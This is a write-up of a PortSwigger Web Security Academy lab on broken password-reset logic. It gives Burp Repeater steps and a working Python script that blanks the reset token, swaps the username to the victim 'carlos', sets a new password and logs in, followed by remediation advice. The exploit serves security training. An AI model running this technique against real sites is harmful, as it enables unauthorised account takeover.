# Password Reset Broken Logic

**Lab:** PortSwigger Web Security Academy — Authentication
**Difficulty:** Apprentice
**Category:** Authentication / Password Reset Mechanisms

**Credentials:** `wiener:peter`
**Victim:** `carlos`

## Problem

The password reset functionality fails to verify that the `temp-forgot-password-token`
parameter actually matches a token the server issued for the account being reset. The
final `POST /forgot-password` request — the one that sets the new password — accepts
the target username as a plain, user-controllable parameter in the request body, and
never cross-checks it against the token. This means an attacker can trigger a password
reset for their own account (to get *any* valid-looking request through the flow), then
replay that request with the `username` swapped to a victim's, setting an arbitrary new
password for that victim without ever possessing their reset token.

## Discovery / Exploitation

1. With Burp running, clicked **Forgot your password?** and submitted my own username
   (`wiener`).
2. Opened the lab's email client, clicked the reset link, and set a new password for
   my own account normally.
3. In Proxy > HTTP history, inspected the reset flow:
   - The reset token is passed as a URL query parameter:
     `GET /forgot-password?temp-forgot-password-token=<token>`
   - The final step, `POST /forgot-password?temp-forgot-password-token=<token>`, submits
     the new password and also sends `username` as a hidden form field in the request
     body.
4. Sent that `POST` request to Repeater and tried deleting the value of
   `temp-forgot-password-token` in both the URL and the body, leaving the parameter
   empty. The reset still succeeded — confirming the server **never validates the
   token** when processing the new password.
5. Requested a fresh password reset in the browser and reset my password again (to
   generate a valid, in-flow request to work from), then sent the resulting `POST`
   request to Repeater once more.
6. In Repeater, emptied `temp-forgot-password-token` in both the URL and the body as
   before, then changed `username` from `wiener` to `carlos`, and set
   `new-password-1` / `new-password-2` to an arbitrary password. Sent the request.
7. Logged in as `carlos` with the new password and opened **My account** — lab solved.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PortSwigger Lab: Password reset broken logic
Exploit: the server never validates temp-forgot-password-token when the new
password is submitted, and the target username is just a user-controlled form
field. This resets carlos's password without ever owning his reset token, then
logs in as him to confirm.
"""

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

NEW_PASSWORD = "password"


def access_carlos_account(url, s):
    # Step 1: reset carlos's password, leaving the token blank/invalid since
    # the server never checks it anyway.
    print("[+] Resetting carlos's password")
    reset_password_url = url + "/forgot-password?temp-forgot-password-token="
    password_reset_data = {
        "temp-forgot-password-token": "",
        "username": "carlos",
        "new-password-1": NEW_PASSWORD,
        "new-password-2": NEW_PASSWORD,
    }
    s.post(
        reset_password_url,
        data=password_reset_data,
        verify=False,
        proxies=proxies,
    )

    # Step 2: log in as carlos using the password we just set.
    print("[+] Logging in as carlos")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": NEW_PASSWORD}
    r2 = s.post(login_url, data=login_data, verify=False, proxies=proxies)

    # Step 3: confirm the exploit worked.
    if "logout" in r2.text:
        print("[+] Successfully logged in to carlos's account")
    else:
        print("[-] Exploit failed")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[+] Usage   : %s <url>" % sys.argv[0])
        print("[+] Example : %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.session()
    url = sys.argv[1]
    access_carlos_account(url, s)


if __name__ == "__main__":
    main()
```

Running it:

```bash
python3 03-password-reset-broken-logic.py https://<lab-id>.web-security-academy.net
```

Output:
```
[+] Resetting carlos's password
[+] Logging in as carlos
[+] Successfully logged in to carlos's account
```

## Remediation

- Bind the reset token to the specific account it was issued for, and validate it
  server-side against that account on every request in the reset flow — never trust a
  `username` field supplied by the client in the same request as the source of truth.
- Make the token the *only* way to identify which account is being reset; drop the
  `username` parameter entirely, or ignore it if a valid token is already scoping the
  request to a specific user.
- Invalidate the token immediately after first use and give it a short expiry window,
  so even a leaked or guessed token can't be reused to reset the password again later.
